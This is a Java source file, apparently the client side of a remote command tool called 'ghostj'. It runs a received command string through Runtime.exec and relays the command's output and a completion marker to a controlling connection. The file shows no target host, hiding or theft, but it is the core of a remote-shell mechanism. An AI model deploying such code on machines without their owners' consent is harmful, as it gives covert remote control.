package com.ghostj.client;

import java.io.*;
import java.nio.charset.Charset;

public class ProcessCmd extends Thread{
    public String cmd="";
    public Process process=null;
    public void run(){
        try{
            ClientMain.processing=true;

            Out.say("ProcessCmd","执行命令");
            process=Runtime.getRuntime().exec(cmd);
            ClientMain.processWriter=new BufferedWriter(new OutputStreamWriter(process.getOutputStream(),"GBK"));

            ClientMain.cmdError=new CmdError(new BufferedReader(new InputStreamReader(process.getErrorStream(),"GBK")));
            ClientMain.cmdError.start();
            Out.say("ProcessCmd","已启动err监听器");

//            BufferedReader proReader=new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
//            String line=null;
//            while((line=proReader.readLine())!=null){
//                System.out.println(line);
//                ClientMain.bufferedWriter.write(line);
//                ClientMain.bufferedWriter.newLine();
//                ClientMain.bufferedWriter.flush();
//            }
//            BufferedInputStream bufferedInputStream=new BufferedInputStream(process.getInputStream());
//            byte bt[]=new byte[20];
//            int len=0;
//            while((len=bufferedInputStream.read(bt))!=-1){
//                System.out.print(new String(bt,0,len));
//            }
            InputStreamReader inputStreamReader=new InputStreamReader(process.getInputStream(),Charset.forName("GBK"));
            int len=0;
            while((len=inputStreamReader.read())!=-1){
                System.out.print((char)len);
                ClientMain.bufferedWriter.write((char)len);
                ClientMain.bufferedWriter.flush();
            }
        }catch (Exception e){
            Out.say("ProcessCmd","error while processing cmd.");
            e.printStackTrace();
        }finally {
            ClientMain.processing=false;
            ClientMain.cmdError.stop();
            Out.say("ProcessCmd","命令已完成");
            try {
                ClientMain.bufferedWriter.write("!命令已完成");
                ClientMain.bufferedWriter.newLine();
                ClientMain.bufferedWriter.flush();
            }catch (Exception e){}
        }
    }
}
